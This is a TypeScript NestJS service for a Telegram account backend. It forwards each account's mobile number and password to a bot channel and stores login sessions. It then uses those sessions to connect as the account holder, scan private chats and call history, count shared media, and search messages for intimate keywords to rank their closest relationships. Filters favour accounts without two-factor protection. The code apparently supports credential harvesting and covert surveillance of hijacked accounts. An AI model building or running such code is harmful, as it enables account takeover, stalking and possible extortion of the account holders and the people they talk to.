import { TelegramService } from './../Telegram/Telegram.service';
import {
  BadRequestException,
  Inject,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
  forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, QueryFilter } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';
import { sleep } from 'telegram/Helpers';
import { Logger } from '../../utils';
import { INTIMATE_KEYWORDS, NEGATIVE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
import { Api } from 'telegram/tl';
import bigInt from 'big-integer';
import { parseError } from '../../utils/parseError';

@Injectable()
export class UsersService {
  private readonly logger = new Logger(UsersService.name);

  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService
  ) { }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
    this.logger.log(`New User received - ${user?.mobile}`);
    this.logger.debug('ActiveClientSetup:', activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
      await this.clientsService.updateClientSession(user.session, user.mobile);
    } else {
      await this.botsService.sendMessageByCategory(
        ChannelCategory.ACCOUNT_LOGINS,
        `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`,
        { parseMode: 'HTML' },
        false
      );
      const newUser = new this.userModel(user);
      const saved = await newUser.save();
      setTimeout(() => {
        this.computeRelationshipScore(user.mobile).catch(err => {
          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
        });
      }, 5000);
      return saved;
    }
  }

  async top(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
    starred?: boolean;
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      gender,
      starred,
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.score': { $gte: minScore },
      ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
    };

    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;
    if (starred) query.starred = true;
    if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
    if (minPhotos > 0) query['photoCount'] = { $gte: minPhotos };
    if (minVideos > 0) query['videoCount'] = { $gte: minVideos };

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session')
      .sort({ 'relationships.score': -1 })
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async leaderboard(options: {
    aspect: string;
    limit?: number;
  }): Promise<{
    ranked: any[];
    stats: { highest: number; average: number; withValue: number };
  }> {
    const { aspect, limit = 25 } = options;
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);

    // Map aspect IDs to MongoDB field expressions
    const ASPECT_MAP: Record<string, { field?: string; computed?: any }> = {
      msgs: { field: 'msgs' },
      totalChats: { field: 'totalChats' },
      personalChats: { field: 'personalChats' },
      channels: { field: 'channels' },
      contacts: { field: 'contacts' },
      totalCalls: { field: 'calls.totalCalls' },
      incomingCalls: { field: 'calls.incoming' },
      outgoingCalls: { field: 'calls.outgoing' },
      videoCalls: { field: 'calls.video' },
      movieCount: { field: 'movieCount' },
      otherPhotos: { field: 'otherPhotoCount' },
      otherVideos: { field: 'otherVideoCount' },
      ownPhotos: { field: 'ownPhotoCount' },
      ownVideos: { field: 'ownVideoCount' },
      relationshipScore: { field: 'relationships.score' },
      relationshipBestScore: { field: 'relationships.bestScore' },
      totalMedia: {
        computed: {
          $add: [
            { $ifNull: ['$photoCount', 0] },
            { $ifNull: ['$videoCount', 0] },
            { $ifNull: ['$otherPhotoCount', 0] },
            { $ifNull: ['$otherVideoCount', 0] },
            { $ifNull: ['$ownPhotoCount', 0] },
            { $ifNull: ['$ownVideoCount', 0] },
          ],
        },
      },
      engagement: {
        computed: {
          $add: [
            { $ifNull: ['$msgs', 0] },
            { $multiply: [{ $ifNull: ['$totalChats', 0] }, 10] },
            { $multiply: [{ $ifNull: ['$calls.totalCalls', 0] }, 20] },
            { $multiply: [{ $ifNull: ['$contacts', 0] }, 2] },
          ],
        },
      },
      recency: { field: 'lastActive' },
    };

    const aspectDef = ASPECT_MAP[aspect];
    if (!aspectDef) {
      throw new BadRequestException(`Unknown aspect: ${aspect}`);
    }

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const matchStage: any = {};
    if (excludedMobiles.length > 0) matchStage.mobile = { $nin: excludedMobiles };

    // For recency, sort by lastActive descending (string comparison works for ISO dates)
    const isRecency = aspect === 'recency';
    const sortField = '_sortValue';

    const valueExpr = aspectDef.computed
      ? aspectDef.computed
      : (isRecency ? `$${aspectDef.field}` : { $ifNull: [`$${aspectDef.field}`, 0] });

    const pipeline: any[] = [
      { $match: matchStage },
      { $addFields: { [sortField]: valueExpr } },
    ];

    // Filter out zero/null values (except recency where we filter empty strings)
    if (isRecency) {
      pipeline.push({ $match: { [sortField]: { $exists: true, $nin: ['', null] } } });
    } else {
      pipeline.push({ $match: { [sortField]: { $gt: 0 } } });
    }

    // Stats facet: get count + avg + max, then top N ranked
    pipeline.push({
      $facet: {
        stats: [
          {
            $group: {
              _id: null,
              withValue: { $sum: 1 },
              average: { $avg: isRecency ? 1 : `$${sortField}` },
              highest: { $max: isRecency ? 1 : `$${sortField}` },
            },
          },
        ],
        ranked: [
          { $sort: { [sortField]: -1 } },
          { $limit: limitNum },
          {
            $project: {
              session: 0,
              password: 0,
            },
          },
        ],
      },
    });

    const [result] = await this.userModel.aggregate(pipeline).allowDiskUse(true).exec();

    const stats = result.stats[0] || { highest: 0, average: 0, withValue: 0 };

    return {
      ranked: result.ranked || [],
      stats: {
        highest: isRecency ? 0 : Math.round(stats.highest || 0),
        average: isRecency ? 0 : Math.round(stats.average || 0),
        withValue: stats.withValue || 0,
      },
    };
  }

  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {
    return this.userModel.find().limit(limit).skip(skip).exec();
  }

  async findAllSorted(limit: number = 100, skip: number = 0, sort?: Record<string, 1 | -1>): Promise<User[]> {
    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const filter = excludedMobiles.length > 0 ? { mobile: { $nin: excludedMobiles } } : {};
    const query = this.userModel.find(filter).lean();
    if (sort) query.sort(sort);
    return query.skip(skip).limit(limit).allowDiskUse(true).exec();
  }

  async summary(): Promise<Record<string, any>> {
    const [result] = await this.userModel.aggregate([
      {
        $facet: {
          totals: [
            {
              $group: {
                _id: null,
                total: { $sum: 1 },
                active: {
                  $sum: { $cond: [{ $gte: ['$lastActive', '2026-01-01'] }, 1, 0] },
                },
                starred: { $sum: { $cond: [{ $eq: ['$starred', true] }, 1, 0] } },
                expired: { $sum: { $cond: [{ $eq: ['$expired', true] }, 1, 0] } },
                withTwoFA: { $sum: { $cond: [{ $eq: ['$twoFA', true] }, 1, 0] } },
                withCalls: {
                  $sum: { $cond: [{ $gt: ['$calls.totalCalls', 0] }, 1, 0] },
                },
                withRelationship: {
                  $sum: { $cond: [{ $gt: ['$relationships.score', 0] }, 1, 0] },
                },
                avgMsgs: { $avg: '$msgs' },
                avgContacts: { $avg: '$contacts' },
                avgChats: { $avg: '$totalChats' },
                totalMsgs: { $sum: '$msgs' },
                totalCalls: { $sum: '$calls.totalCalls' },
                totalContacts: { $sum: '$contacts' },
              },
            },
          ],
          genderBreakdown: [
            { $group: { _id: '$gender', count: { $sum: 1 } } },
          ],
        },
      },
    ]).allowDiskUse(true).exec();

    const totals = result.totals[0] || {};
    const genderBreakdown = Object.fromEntries(
      (result.genderBreakdown || []).map((g: any) => [g._id || 'unknown', g.count]),
    );

    return {
      total: totals.total || 0,
      active: totals.active || 0,
      starred: totals.starred || 0,
      expired: totals.expired || 0,
      withTwoFA: totals.withTwoFA || 0,
      withCalls: totals.withCalls || 0,
      withRelationship: totals.withRelationship || 0,
      avgMsgs: Math.round(totals.avgMsgs || 0),
      avgContacts: Math.round(totals.avgContacts || 0),
      avgChats: Math.round(totals.avgChats || 0),
      totalMsgs: totals.totalMsgs || 0,
      totalCalls: totals.totalCalls || 0,
      totalContacts: totals.totalContacts || 0,
      genderBreakdown,
    };
  }

  async paginated(options: {
    page?: number;
    limit?: number;
    sortBy?: string;
    sortOrder?: 'asc' | 'desc';
    search?: string;
    filter?: 'all' | 'active' | 'starred' | 'expired' | 'withCalls';
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 50,
      sortBy = 'lastActive',
      sortOrder = 'desc',
      search,
      filter = 'all',
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 200);
    const skip = (pageNum - 1) * limitNum;

    const query: any = {};

    // Apply filter
    if (filter === 'active') query.lastActive = { $gte: '2026-01-01' };
    else if (filter === 'starred') query.starred = true;
    else if (filter === 'expired') query.expired = true;
    else if (filter === 'withCalls') query['calls.totalCalls'] = { $gt: 0 };

    // Apply search (name, mobile, username, tgId)
    if (search?.trim()) {
      const q = search.trim();
      query.$or = [
        { firstName: { $regex: q, $options: 'i' } },
        { lastName: { $regex: q, $options: 'i' } },
        { username: { $regex: q, $options: 'i' } },
        { mobile: { $regex: q } },
        { tgId: q },
      ];
    }

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const sort: Record<string, 1 | -1> = { [sortBy]: sortOrder === 'asc' ? 1 : -1 };

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort(sort)
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async findOne(tgId: string): Promise<User> {
    const doc = await this.userModel.findOne({ tgId }).exec();
    if (!doc) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return doc.toJSON();
  }

  async update(tgId: string, updateDto: UpdateUserDto): Promise<User> {
    const updated = await this.userModel
      .findOneAndUpdate({ tgId }, { $set: updateDto }, { new: true })
      .exec();
    if (!updated) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return updated;
  }

  async updateByFilter(
    filter: QueryFilter<UserDocument>,
    updateDto: UpdateUserDto,
  ): Promise<number> {
    const result = await this.userModel
      .updateMany(filter, { $set: updateDto })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users matching filter not found`);
    }
    return result.modifiedCount;
  }

  async toggleStar(mobile: string): Promise<{ mobile: string; starred: boolean }> {
    const user = await this.userModel.findOne({ mobile }).select('mobile starred').exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    const newVal = !user.starred;
    await this.userModel.updateOne({ mobile }, { $set: { starred: newVal } }).exec();
    return { mobile, starred: newVal };
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.updateOne({ tgId }, { $set: { expired: true } }).exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    const query: QueryFilter<UserDocument> = { ...filter };

    const escapeRegex = (text: string) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regexFields = ['firstName', 'lastName', 'username', 'mobile'];
    for (const field of regexFields) {
      if (typeof query[field] === 'string' && query[field]) {
        query[field] = { $regex: new RegExp(escapeRegex(query[field] as string), 'i') };
      }
    }

    if (!filter.mobile) {
      let excludedMobiles: string[] = [];
      try {
        excludedMobiles = await this.telegramService.getOwnAccountMobiles();
      } catch { }
      if (excludedMobiles.length > 0) {
        query.mobile = { $nin: excludedMobiles } as any;
      }
    }

    return this.userModel.find(query).sort({ updatedAt: -1 }).limit(200).exec();
  }

  async computeRelationshipScore(mobile: string): Promise<void> {
    const wasConnected = connectionManager.hasClient(mobile);
    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;

    try {
      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
      const me = await telegramClient.getMe();
      const selfId = me.id?.toString();

      // ─── Phase 1: Hybrid candidate discovery ───
      // Source A: GetTopPeers — Telegram's server-side interaction ranking (not recency-biased)
      // Source B: iterDialogs — recent chats (catches new relationships GetTopPeers hasn't ranked yet)
      // Merge + dedup to get the best of both worlds

      const candidateMap = new Map<string, { id: string; name: string; username: string | null; phone: string | null; source: 'topPeers' | 'dialogs' | 'both' }>();
      const excludedIds = new Set(['777000', '42', '333000', '178220800']);
      try {
        const ownAccountIds = await this.telegramService.getOwnAccountTgIds();
        for (const id of ownAccountIds) excludedIds.add(id);
      } catch (e) {
        this.logger.warn(`[${mobile}] Failed to fetch own account IDs: ${(e as Error).message}`);
      }

      // Source A: GetTopPeers (1 API call — most valuable signal)
      try {
        const topPeersResult = await telegramClient.client.invoke(
          new Api.contacts.GetTopPeers({
            correspondents: true,
            phoneCalls: true,
            forwardUsers: true,
            offset: 0,
            limit: 50,
            hash: bigInt(0),
          }),
        );

        if (topPeersResult instanceof Api.contacts.TopPeers) {
          const userMap = new Map<string, Api.User>();
          for (const u of topPeersResult.users || []) {
            if (u instanceof Api.User && !u.bot) {
              userMap.set(u.id.toString(), u);
            }
          }

          for (const category of topPeersResult.categories || []) {
            for (const topPeer of category.peers || []) {
              const peerId = (topPeer.peer as any)?.userId?.toString();
              if (!peerId || peerId === selfId || excludedIds.has(peerId)) continue;
              const user = userMap.get(peerId);
              if (!user) continue;
              candidateMap.set(peerId, {
                id: peerId,
                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
                username: user.username || null,
                phone: user.phone || null,
                source: 'topPeers',
              });
            }
          }
          this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
        }
      } catch (topPeersError) {
        this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${(topPeersError as Error).message}`);
      }

      // Source B: iterDialogs — recent private chats (catches what GetTopPeers misses)
      try {
        let dialogCount = 0;
        for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
          if (!d.isUser || !(d.entity instanceof Api.User)) continue;
          const user = d.entity as Api.User;
          if (user.bot) continue;
          const id = user.id.toString();
          if (id === selfId || excludedIds.has(id)) continue;

          const existing = candidateMap.get(id);
          if (existing) {
            existing.source = 'both';
          } else {
            candidateMap.set(id, {
              id,
              name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
              username: user.username || null,
              phone: user.phone || null,
              source: 'dialogs',
            });
          }
          dialogCount++;
          if (dialogCount >= 40) break;
        }
        this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
      } catch (dialogError) {
        this.logger.warn(`[${mobile}] iterDialogs failed: ${(dialogError as Error).message}`);
      }

      if (candidateMap.size === 0) {
        this.logger.log(`[${mobile}] No candidates found from either source`);
        return;
      }

      // ─── Phase 1.5: Contacts for mutual detection ───
      const mutualChatIds = new Set<string>();
      try {
        const contactsResult = await telegramClient.getContacts();
        if (contactsResult && 'users' in contactsResult) {
          for (const user of (contactsResult as any).users || []) {
            if (user.mutualContact) mutualChatIds.add(user.id?.toString());
          }
        }
      } catch { }

      // ─── Phase 2: Per-chat enrichment (top 15 candidates) ───
      // For each candidate: message count, media count, voice count, call stats,
      // common chats, intimate keyword search — NO media filter (text-heavy relationships qualify)

      const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
      const candidates: RelationshipCandidate[] = [];
      const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };

      for (const candidate of allCandidates) {
        try {
          if (excludedIds.has(candidate.id)) continue;
          try {
            const entity = await telegramClient.client.getEntity(candidate.id);
            if ((entity as any).bot) continue;
          } catch { }

          const chatPeer = await telegramClient.getchatId(candidate.id);

          // Message count (1 API call)
          let totalMessages = 0;
          let lastMessageDate: string | null = null;
          try {
            const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
            totalMessages = (msgResult as any)?.total ?? 0;
            const lastMsg = (msgResult as any)?.[0];
            if (lastMsg?.date) {
              lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
            }
          } catch { }

          // Skip chats with < 5 messages (noise)
          if (totalMessages < 5) {
            await sleep(100);
            continue;
          }

          // Media + voice counts via GetSearchCounters (1 API call, 4 filters)
          // Photos + round videos = personal media (full weight)
          // Regular videos counted separately (discounted — could be forwarded large files)
          // Documents excluded entirely (not relationship signals)
          let photoCount = 0;
          let videoCount = 0;
          let roundVideoCount = 0;
          let voiceCount = 0;
          try {
            const counters = await telegramClient.client.invoke(
              new Api.messages.GetSearchCounters({
                peer: chatPeer,
                filters: [
                  new Api.InputMessagesFilterPhotos(),
                  new Api.InputMessagesFilterVideo(),
                  new Api.InputMessagesFilterRoundVideo(),
                  new Api.InputMessagesFilterVoice(),
                ],
              }),
            );
            const counterArr = counters as any as Array<{ count: number }>;
            photoCount = counterArr?.[0]?.count ?? 0;
            videoCount = counterArr?.[1]?.count ?? 0;
            roundVideoCount = counterArr?.[2]?.count ?? 0;
            voiceCount = counterArr?.[3]?.count ?? 0;
          } catch { }
          // Personal media = photos + round videos (always small/personal)
          // Regular videos discounted 50% (many are forwarded movies/clips >20MB)
          const mediaCount = photoCount + roundVideoCount + Math.floor(videoCount * 0.5);

          // Call stats — includeCalls=true to get per-call entries for duration filtering
          let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0, meaningfulCalls: 0 };
          try {
            const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, true);
            const meaningfulCalls = (callHistory as any).calls
              ? (callHistory as any).calls.filter((c: any) => c.durationSeconds > 30).length
              : (callHistory.averageDuration > 30 ? callHistory.totalCalls : 0);
            callStats = {
              totalCalls: callHistory.totalCalls,
              incoming: callHistory.incoming,
              outgoing: callHistory.outgoing,
              videoCalls: callHistory.videoCalls,
              audioCalls: callHistory.audioCalls,
              totalDuration: callHistory.totalDuration,
              averageDuration: callHistory.averageDuration,
              meaningfulCalls,
            };
            callAgg.totalCalls += callStats.totalCalls;
            callAgg.incoming += callStats.incoming;
            callAgg.outgoing += callStats.outgoing;
            callAgg.video += callStats.videoCalls;
            callAgg.audio += callStats.audioCalls;
          } catch { }

          // Common chats
          let commonChats = 0;
          try {
            const common = await telegramClient.client.invoke(
              new Api.messages.GetCommonChats({
                userId: candidate.id,
                maxId: bigInt(0),
                limit: 100,
              }),
            );
            commonChats = (common as any)?.chats?.length ?? 0;
          } catch { }

          // Keyword search — intimate (positive) + movie/piracy (negative)
          let intimateMessageCount = 0;
          let negativeKeywordCount = 0;

          const searchKeyword = async (keyword: string): Promise<number> => {
            try {
              const result = await telegramClient.client.invoke(
                new Api.messages.Search({
                  peer: chatPeer,
                  q: keyword,
                  filter: new Api.InputMessagesFilterEmpty(),
                  minDate: 0,
                  maxDate: 0,
                  offsetId: 0,
                  addOffset: 0,
                  limit: 1,
                  maxId: 0,
                  minId: 0,
                  hash: bigInt(0),
                }),
              );
              await sleep(150);
              return (result as any)?.count ?? 0;
            } catch { return 0; }
          };

          for (const keyword of INTIMATE_KEYWORDS) {
            intimateMessageCount += await searchKeyword(keyword);
          }
          for (const keyword of NEGATIVE_KEYWORDS) {
            negativeKeywordCount += await searchKeyword(keyword);
          }

          candidates.push({
            chatId: candidate.id,
            name: candidate.name,
            username: candidate.username,
            phone: candidate.phone,
            messages: totalMessages,
            mediaCount,
            voiceCount,
            intimateMessageCount,
            negativeKeywordCount,
            calls: {
              total: callStats.totalCalls,
              incoming: callStats.incoming,
              videoCalls: callStats.videoCalls,
              avgDuration: callStats.averageDuration,
              totalDuration: callStats.totalDuration,
              meaningfulCalls: callStats.meaningfulCalls,
            },
            commonChats,
            isMutualContact: mutualChatIds.has(candidate.id),
            lastMessageDate,
          });

          this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
          await sleep(200);
        } catch (chatError) {
          this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${(chatError as Error).message}`);
        }
      }

      // ─── Phase 3: Rank, persist ───
      const top = rankRelationships(candidates, 5);
      const accountScore = computeAccountScore(top);
      const bestScore = top.length > 0 ? top[0].score : 0;

      await this.userModel.updateOne(
        { mobile },
        {
          $set: {
            'relationships.score': accountScore,
            'relationships.bestScore': bestScore,
            'relationships.computedAt': new Date(),
            'relationships.top': top,
            calls: callAgg,
          },
        },
      ).exec();

      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
    } catch (error) {
      parseError(error, `[${mobile}] computeRelationshipScore failed`);
    } finally {
      if (!wasConnected && telegramClient) {
        await connectionManager.unregisterClient(mobile).catch(() => undefined);
      }
    }
  }

  async topRelationships(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    gender?: string;
    excludeTwoFA?: boolean;
  }) {
    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.bestScore': { $gt: minScore },
      ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
    };
    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;

    const total = await this.userModel.countDocuments(query).exec();
    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort({ 'relationships.bestScore': -1 })
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
  }

  async getUserRelationships(mobile: string) {
    const user = await this.userModel
      .findOne({ mobile })
      .select('mobile firstName lastName tgId relationships')
      .lean()
      .exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    return user;
  }

  async aggregateSort(
    computedField: string,
    sortOrder: 1 | -1 = -1,
    limit: number = 20,
    skip: number = 0,
  ): Promise<any[]> {
    const COMPUTED_FIELDS: Record<string, any> = {
      intimateTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.intimateMessageCount', 0] }] },
        },
      },
      privateMsgsTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.messages', 0] }] },
        },
      },
      privateMediaTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.mediaCount', 0] }] },
        },
      },
      privateVoiceTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.voiceCount', 0] }] },
        },
      },
      privateMsgsBestContact: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.messages', 0] }, 0],
      },
      relTopIntimate: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.intimateMessageCount', 0] }, 0],
      },
      relTopMedia: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.mediaCount', 0] }, 0],
      },
      relTopVoice: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.voiceCount', 0] }, 0],
      },
      relCommonChats: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.commonChats', 0] }, 0],
      },
      relTopCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.total', 0] }, 0],
      },
      relMeaningfulCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.meaningfulCalls', 0] }, 0],
      },
      relMutualContacts: {
        $size: {
          $filter: {
            input: { $ifNull: ['$relationships.top', []] },
            as: 'r',
            cond: { $eq: ['$$r.isMutualContact', true] },
          },
        },
      },
      callPartners: {
        $size: { $ifNull: ['$calls.chats', []] },
      },
      totalCallDuration: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalDuration', 0] }] },
        },
      },
      longestCall: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $max: ['$$value', { $ifNull: ['$$this.longestCall', 0] }] },
        },
      },
      missedCalls: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.missed', 0] }] },
        },
      },
      privateMsgsCallPartners: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalMessages', 0] }] },
        },
      },
    };

    const fieldExpr = COMPUTED_FIELDS[computedField];
    if (!fieldExpr) {
      throw new BadRequestException(`Unknown computed field: ${computedField}`);
    }

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const pipeline: any[] = [];
    if (excludedMobiles.length > 0) {
      pipeline.push({ $match: { mobile: { $nin: excludedMobiles } } });
    }
    pipeline.push(
      { $addFields: { _computedSort: fieldExpr } },
      { $sort: { _computedSort: sortOrder } },
      { $skip: skip },
      { $limit: limit },
      { $project: { _computedSort: 0 } },
    );

    return this.userModel.aggregate(pipeline).allowDiskUse(true).exec();
  }

  async executeQuery(
    query: QueryFilter<UserDocument>,
    sort?: Record<string, 1 | -1>,
    limit?: number,
    skip?: number,
  ): Promise<User[]> {
    if (!query) {
      throw new BadRequestException('Query is invalid.');
    }

    try {
      const queryExec = this.userModel.find(query).lean();

      if (sort) queryExec.sort(sort);
      if (limit) queryExec.limit(limit);
      if (skip) queryExec.skip(skip);

      return await queryExec.allowDiskUse(true).exec();
    } catch (error: any) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
